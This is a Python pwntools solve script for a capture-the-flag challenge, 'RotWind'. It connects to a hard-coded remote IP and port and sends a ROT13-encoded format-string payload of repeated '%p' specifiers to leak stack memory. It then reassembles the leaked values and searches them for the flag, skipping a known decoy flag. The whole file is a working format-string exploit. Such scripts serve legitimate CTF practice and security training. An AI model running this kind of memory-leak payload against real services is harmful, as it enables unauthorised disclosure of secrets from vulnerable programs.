#!/usr/bin/env python3
"""02 RotWind: remote blind solve (pwntools + network only)."""
from pwn import *
import codecs
import re

HOST = '167.86.100.57'
PORT = 9002
HONEYPOT = b'nustCTF{r0tw1nd_h0n3yp0t_n0t_r34l}'

context.arch = 'amd64'
context.log_level = 'error'
io = remote(HOST, PORT)
io.recvuntil(b'message')
io.sendline(codecs.encode('%p.' * 25, 'rot_13').encode())

data = io.recvall(timeout=2).decode(errors='ignore')
vals = [int(x, 16) for x in re.findall(r'0x([0-9a-fA-F]+)', data)]
blob = b''.join(p64(v) for v in vals)

idx = blob.find(b'nustCTF{')
while idx >= 0:
    cand = blob[idx:].split(b'\x00')[0]
    if cand != HONEYPOT:
        print(cand.decode(errors='ignore'))
        break
    idx = blob.find(b'nustCTF{', idx + 1)
else:
    # fallback: print whole blob decode attempt
    print(blob.decode(errors='ignore'))
